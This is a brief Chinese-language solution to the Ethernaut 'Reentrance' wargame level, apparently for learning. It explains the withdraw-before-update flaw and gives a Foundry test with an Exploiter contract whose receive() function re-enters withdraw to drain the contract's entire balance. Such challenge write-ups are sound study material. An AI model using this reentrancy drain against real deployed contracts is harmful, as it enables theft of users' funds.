在 `withdraw` 函数中，先发起了转账再修改 balance 数据，从而允许在接受到转账时发起下一次 withdraw，从而在 balance 修改前转出全部资金。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        uint256 insertCoin = ReentranceFactory(payable(address(levelFactory))).insertCoin();
        levelAddress = payable(this.createLevelInstance{value: insertCoin}(true));
        level = Reentrance(levelAddress);

        assertEq(address(level).balance, insertCoin);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        uint256 playerBalance = player.balance;
        uint256 levelBalance = address(level).balance;

        Exploiter exploiter = new Exploiter(level);
        exploiter.exploit{value: levelBalance / 20}();
        exploiter.withdraw();

        assertEq(player.balance, playerBalance + levelBalance);

        vm.stopPrank();
    }
}

contract Exploiter {
    Reentrance private level;
    address private owner;

    constructor(Reentrance _level) public {
        owner = msg.sender;
        level = _level;
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
    }

    function exploit() external payable {
        level.donate{value: msg.value}(address(this));

        level.withdraw(msg.value);
    }

    receive() external payable {
        uint256 balance = address(level).balance;
        if (balance > 0) {
            uint256 withdrawAmount = msg.value;
            if (withdrawAmount > balance) {
                withdrawAmount = balance;
            }
            level.withdraw(withdrawAmount);
        }
    }
}
```

